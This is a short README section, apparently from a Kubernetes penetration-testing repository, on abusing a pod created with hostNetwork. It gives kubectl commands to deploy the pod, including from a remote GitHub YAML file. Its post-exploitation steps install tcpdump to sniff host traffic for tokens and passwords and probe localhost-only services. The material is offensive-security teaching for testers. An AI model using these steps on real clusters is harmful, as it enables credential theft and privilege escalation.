## You can create a pod with only hostNetwork

If you only have `hostNetwork=true`, you can't get RCE on the host directly, but if your cross your fingers you might still find a path to cluster admin. 
The important things here are: 
* You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
* You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`

[pod-hostnetwork-only.yaml](pod-hostnetwork-only.yaml)


### Create pod
```bash 
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostnetwork-only.yaml  [-n namespace] 

# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork-only/pod-hostnetwork-only.yaml [-n namespace] 
```

### Exec into pod 

```bash
kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
```

### Post Exploitation 
```bash
# Install tcpdump and sniff traffic 
# Note: If you can't install tools to your pod (no internet access), you will have to change the image in your pod yaml to something that already includes tcpdump, like https://hub.docker.com/r/corfr/tcpdump

apt update && apt install tcpdump 



# Or investigate local services
curl https://localhost:1234/metrics
```